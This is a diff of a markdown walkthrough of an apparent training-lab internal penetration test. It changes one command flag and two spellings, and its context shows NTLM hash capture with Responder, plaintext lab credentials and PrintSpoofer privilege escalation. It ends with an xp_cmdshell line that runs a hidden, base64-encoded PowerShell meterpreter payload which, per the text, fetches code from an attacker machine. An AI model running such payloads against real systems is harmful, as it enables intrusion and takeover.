@@ -8,7 +8,7 @@ Our client Inlanefreight has contracted us again to perform a full-scope interna
 
 To obtain a **NTLM** hash i used the **responder** tool
 ```bash
-responder -I ens24 -wrf
+responder -I ens24 -wrfv
 ```
 
 - `-I`: indicate which network interface we'll be use
@@ -146,7 +146,7 @@ With this credential is possible access to the `172.16.7.60` SQL server machine.
 mssqlclient.py INLANEFREIGHT/netdb:D@ta_bAse_adm1n\!@172.16.7.60
 ```
 
-using the `whomai /priv` command is possible to visualize all privilege. In this case we can **escalate privilege** trough **SeImpersonatePrivilage** with [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe).
+using the `whomai /priv` command is possible to visualize all privilege. In this case we can **escalate privilege** trought **SeImpersonatePrivilage** with [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe).
 ![[Pasted image 20250519013904.png]]
 
 Firs all download and copy on attack machine
@@ -190,7 +190,7 @@ crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --get-fil
 
 Using msfconsole with `web_delivery` module i have create a PowerShell meterpreter shell
 ![[Pasted image 20250519224425.png]]
-Once do that i execute this payload in the `SQL01` target machine trough PrintSpoofer64 to have a administrator shell
+Once do that i execute this payload in the `SQL01` target machine trought PrintSpoofer64 to have a administrator shell
 
 ```bash
 xp_cmdshell C:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB2AE4ATQA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJAB2AE4ATQAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAHYATgBNAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AbgBhADEAVAA1ADQAZwAwAHYAOAAvADYAYgBzAEMARQBnAFgAbwBTAHgASABjAFMAZQBXACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADcALgAyADQAMAA6ADgAMAA4ADAALwBuAGEAMQBUADUANABnADAAdgA4ACcAKQApADsA"
